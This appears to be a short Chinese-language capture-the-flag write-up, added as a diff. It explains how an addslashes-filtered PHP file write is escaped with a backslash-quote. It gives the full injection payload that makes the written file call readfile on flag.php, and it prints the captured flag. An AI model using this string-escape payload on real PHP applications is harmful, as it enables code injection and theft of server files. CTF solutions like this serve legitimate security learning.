@@ -1,0 +1,11 @@
+由说明和代码可知，本题是由re.php将输入shell简单过滤后写入文件，读取flag.php得到flag。
+
+因为addslashes没有过滤 '\'，所以输入 "\'" 即可逃出。
+
+shell 为：
+
+../flag.php\'; readfile(substr($shell, 0, -1)); ?>
+
+得到 flag:
+
+TSCTF{h4pp9_enj0y_re93x_T0_3x3c__!!!} ';?>
